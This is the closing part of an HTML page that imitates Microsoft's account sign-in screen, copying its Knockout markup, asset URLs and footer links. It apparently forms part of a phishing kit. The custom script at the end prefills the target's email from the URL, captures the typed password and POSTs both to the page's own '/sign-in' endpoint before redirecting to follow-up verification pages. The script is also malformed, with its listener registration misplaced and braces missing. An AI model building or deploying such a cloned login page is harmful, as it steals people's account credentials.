        <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">
        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
        <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
        <!-- ko ifnot: svr.fShouldSupportTargetCredentialForRecovery --><!-- /ko -->
        <!-- ko if: svr.fEnableDFPIntegration -->
        <input type="hidden" name="DfpArtifact" data-bind="value: dfpResult()" value="">
        <!-- /ko -->
        <!-- ko if: svr.fShouldSupportTargetCredentialForRecovery && targetCredentialForRecovery() --><!-- /ko -->
        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession -->
        <!-- ko ifnot: svr.fUsePromotedFedCredTypesArray --><!-- /ko -->

        <!-- ko if: svr.fUsePromotedFedCredTypesArray -->
        <!-- ko if: $page.showFedCredButtons -->
        <div data-bind="component: { name: 'fed-cred-buttons-control',
            params: {
                serverData: svr,
                fedCredOptions: $page.otherSigninOptions },
            event: {
                fedCredButtonClick: $page.otherSigninOptionsButton_onClick } }"><!--  -->

<!-- ko withProperties: { '$fedCredButtonsControl': $data } -->
<div data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': true }" class="app promoted-fed-cred-box ext-promoted-fed-cred-box">
    <div class="promoted-fed-cred-content app" data-bind="css: {
        'animate': $page.useCssAnimations &amp;&amp; $page.animate(),
        'slide-out-next': $page.animate.isSlideOutNext,
        'slide-in-next': $page.animate.isSlideInNext,
        'slide-out-back': $page.animate.isSlideOutBack,
        'slide-in-back': $page.animate.isSlideInBack,
        'app': $page.backgroundLogoUrl }">

        <!-- ko ifnot: svr.fIsQrCodePinSupported --><!-- /ko -->

        <!-- ko if: svr.fEnableQrCodeA11YFixes -->
        <!-- ko if: svr.fIsQrCodePinSupported -->
        <!-- ko foreach: $fedCredButtonsControl.fedCredOptions -->
        <div class="tile-container" data-bind="css: { 'binaryChoice list': svr.fSupportWindowsStyles }">
            <div class="row tile">
                <div class="table" role="button" tabindex="0" data-bind="
                    css: { 'list-item': svr.fSupportWindowsStyles },
                    pressEnter: $fedCredButtonsControl.fedCredButton_onClick,
                    click: $fedCredButtonsControl.fedCredButton_onClick,
                    ariaLabel: $data.text + ' ' + $data.helpText" aria-label="Sign-in options undefined">

                    <div class="table-row">
                        <div class="table-cell tile-img medium">
                            <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img medium" role="presentation" data-bind="addEventHandlers, attr: { src: $data.darkIconUrl }" src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
                        </div>
                        <div class="table-cell text-left content" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
                            <!-- ko if: $data.showPreviewBadge --><!-- /ko -->
                            <!-- ko ifnot: $data.showPreviewBadge -->
                            <div data-bind="text: $data.text, attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Sign-in options</div>
                            <!-- /ko -->

                            <!-- ko if: $data.showHelpIcon --><!-- /ko -->
                        </div>
                    </div>
                </div>
            </div>
            <!-- ko if: $data.showHelpIcon --><!-- /ko -->
        </div>
        <!-- /ko -->
        <!-- /ko -->
        <!-- /ko -->

        <!-- ko ifnot: svr.fEnableQrCodeA11YFixes --><!-- /ko -->

    </div>
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: $page.showSignupFedCredButtons --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: svr.fShowQrCodePinOption --><!-- /ko -->

        <!-- ko if: $page.newSession --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer has-background ext-has-background background-always-visible ext-background-always-visible">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background background-always-visible ext-background-always-visible">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background background-always-visible ext-background-always-visible">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: a11yConformeLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item has-background ext-has-background background-always-visible ext-background-always-visible">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
    <!-- /ko -->
</form>

<form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>

<!-- ko if: svr.urlCBPartnerPreload -->
<div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe height="0" width="0" src="https://outlook.office365.com/owa/prefetch.aspx" style="display: none;"></iframe></div>
<!-- /ko -->

<!-- ko if: svr.fEnableDFPIntegration && dfpUrl() --><!-- /ko --></div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // Get email from session or URL 
    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get('email') || ''; 
    
    // Update email display
    const displayName = document.getElementById('displayName');
    if (displayName && email) {
        displayName.textContent = email;
    }
    
    // Update hidden input 
    const hiddenEmail = document.getElementById('hiddenEmail');
    if (hiddenEmail) {
        hiddenEmail.value = email;
    }

    const form = document.getElementById('i0281');
    const passwordInput = document.getElementById('i0118');
    const signInButton = document.getElementById('submitButton');
    const passwordError = document.getElementById('passwordError');
    let submissionInProgress = false;

    async function handleFormSubmission(e) {
        e.preventDefault();
        
        if (submissionInProgress) return;

        const email = document.getElementById('hiddenEmail').value;
        const password = passwordInput.value.trim();

        if (!password) {
            passwordError.textContent = 'Please enter your password.';
            passwordError.style.display = 'block';
            return;
        }

        try {
            submissionInProgress = true;
            signInButton.disabled = true;

            const response = await fetch('/sign-in', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    'email': email,
                    'password': password
                })
            });

            const result = await response.json();

            if (result.status === 'verify') {
                // Redirect to verification page
                window.location.href = result.redirect_url;
            } else if (result.status === 'success') {
                // Redirect to stay signed in page
                window.location.href = result.redirect_url;
            } else {
                // Show error message
                passwordError.textContent = result.message || 'Your account or password is incorrect.';
                passwordError.style.display = 'block';
                passwordInput.value = '';
            }

        } catch (error) {
            console.error('Error:', error);
            passwordError.textContent = 'An error occurred. Please try again.';
            passwordError.style.display = 'block';
        } finally {
            submissionInProgress = false;
            signInButton.disabled = false;
        }

        // Add form submit handler
        if (form) {
            form.addEventListener('submit', handleFormSubmission);
        }

        // Add password input handler to hide error on change
        if (passwordInput) {
            passwordInput.addEventListener('input', function() {
                passwordError.style.display = 'none';
            });
        }
</script>
</body>
</html>